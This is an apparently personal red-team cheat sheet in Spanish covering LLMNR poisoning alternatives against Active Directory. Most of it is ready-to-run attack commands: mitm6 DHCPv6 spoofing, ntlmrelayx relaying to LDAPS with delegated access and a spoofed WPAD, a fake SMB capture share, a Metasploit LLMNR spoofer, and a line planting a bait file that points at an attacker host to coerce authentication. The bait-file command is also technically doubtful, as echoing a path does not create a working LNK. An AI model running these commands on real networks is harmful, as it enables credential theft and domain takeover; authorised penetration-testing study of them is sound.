---
aliases:
  - LLMNR Tooling
  - mitm6 alternativa
tags:
  - technique/credential-access
  - technique/mitm
  - asset/active-directory
  - env/windows
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Credential Harvesting]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: SubCheatSheet
linked:
  - "[[LLMNR & NBT-NS Poisoning]]"
  - "[[mitm6 - IPv6 DHCP Spoofing]]"
---
# LLMNR Poisoning - mitm6 y Tooling

> Cuando LLMNR está deshabilitado por GPO, **mitm6** (IPv6) suele funcionar — Windows prefiere IPv6, casi siempre habilitado y sin configurar.

---

## mitm6 (IPv6 DHCP Poison)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `sudo mitm6 -d corp.local --no-ra` | Atacante como DNS IPv6 default vía DHCPv6 | LLMNR disabled por GPO. |
| `sudo impacket-ntlmrelayx -6 -t ldaps://$DC --delegate-access --no-smb-server -wh fakewpad.corp.local` | Relay LDAPS con WPAD spoofeado | En paralelo a mitm6 → [[mitm6 - IPv6 DHCP Spoofing]]. |
^llmnr-mitm6

## Forzar Resoluciones y Tools Auxiliares

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `smbclient -N '\\NONEXISTENT\share'` | Dispara una query LLMNR para test | Verificar que Responder captura. |
| `impacket-smbserver share /tmp/loot -smb2support` | Fake SMB share liviano (sin Responder full) | Captura puntual. |
| `metasploit auxiliary/spoof/llmnr/llmnr_response` | LLMNR spoof desde MSF | Integración Metasploit. |
| `echo '\\attacker\bait' > trigger.lnk` (en un share) | LNK/SCF que dispara auth al renderizar | Coerción pasiva en shares. |
^llmnr-tools

> [!tip] LLMNR está muriendo
> En 2025 muchos entornos ya deshabilitan LLMNR/NBT-NS por GPO. **mitm6** es la alternativa más fiable (IPv6 casi siempre on). Probá mitm6 primero si Responder no captura nada.
